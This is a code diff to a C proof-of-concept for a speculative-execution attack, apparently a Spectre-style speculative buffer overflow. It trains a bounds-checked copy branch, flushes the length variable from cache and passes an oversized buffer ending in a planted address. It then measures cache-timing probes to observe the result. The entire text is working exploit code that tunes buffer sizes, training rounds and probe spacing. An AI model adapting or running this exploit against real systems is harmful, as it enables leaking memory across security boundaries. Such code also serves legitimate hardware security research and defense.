@@ -21,7 +21,7 @@ void target_fn(void) __attribute__((section(".targetfn")));
 void end_target_fn(void);
 
 // Use Global instead of local for easier flushing?
-int max_len = 12;
+int __attribute__((section(".max_len"))) max_len = 101;
 
 /*
  * Defines the bandwidth we can communicate from speculative -> von neuman
@@ -36,7 +36,7 @@ int max_len = 12;
  * I'll load buf[2048] for you") Generally, this results in not seeing ANY 
  * winning probes in which case, we change cur_probe_space and retry.
  */
-#define MAX_PROBE_SPACE (1000003)
+#define MAX_PROBE_SPACE (10003)
 
 /*
  * The (heap-allocated) probe buffer
@@ -81,7 +81,8 @@ void check_probes() {
 
     int i, mix_i;
     for (i=0; i<NUM_PROBES; i++) {
-		mix_i = ((i* 167) +13) & NUM_PROBES-1;
+        //mix_i = ((i* 167) +13) & NUM_PROBES-1;
+        mix_i = i;
         addr = &probe_buf[mix_i*cur_probe_space];
         t0 = _rdtscp(&junk);
         asm volatile( "movb (%%rbx), %%al\n"
@@ -98,45 +99,46 @@ void check_probes() {
     flush_probe_buf();
 }
 
-
 void branch(char* str, int len){
-    char local_str[12]= {
-            0x88,0x88,0x88,0x88,0x88,0x88,
-            0x88,0x88,0x88,0x88,0x88,0x88};
+    char local_str[101];
 
-    _mm_clflush(&max_len);
 
     if (len < max_len){
-        strcpy(local_str, str);
+        register i;
+        for (i=0; i<len; i++) {
+            local_str[i] = str[i];
+        }
+        //memcpy(local_str, str, len);
         return;
-    } 
+    }
     return;
 }
 
-void train_branch(){    
+void train_branch(){
     int i =0;
-    int training_rounds = 200; 
-    
+    int training_rounds = 2000;
+    char buf[80];
+
+    memset(buf, 'A', 80);
+
     for (i=0; i< training_rounds; i++){
-        branch("Plain", 5);
+        branch(buf, 80);
     }
 }
 
 void trick_branch(){
-    char overflow[36] = {
-            0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,
-            0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,
-            0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,
-            0x44,0x44,0x44,0x44,0x40,0x40,0x43,0x00
-        };
-    branch(overflow, 36);
+    char overflow[136];
+    memset(overflow, 0x44, sizeof(overflow));
+    ((uint64_t *)overflow)[(sizeof(overflow)-1)/sizeof(uint64_t)] = 0x0434040;
+
+    branch(overflow, sizeof(overflow));
 }
 
 void measure() {
     int i, j;
 
     int misses = 0;
-    uint64_t k = 3;
+    uint64_t k = 1;
     uint64_t width = 8;
     uint64_t top_k_i[k]; 
     uint64_t top_k_res[k]; 
@@ -144,16 +146,17 @@ void measure() {
     bool hit_miss=0;
 
     while (1) {
+        //flush_probe_buf_i();
         for (i=0; i<MAX_ITERATIONS; i++) {
-            
             train_branch();
-            flush_probe_buf_i();
+            _mm_clflush(&max_len);
             trick_branch();
-            
+            check_probes();
         }
+
         uint64_t avg = 0;
         if (cache_hits > 0) avg = tot_time/cache_hits;
-        
+
         // the results array is global
         hit_miss = get_top_k(k, results, top_k_i, top_k_res, MAX_ITERATIONS);
 
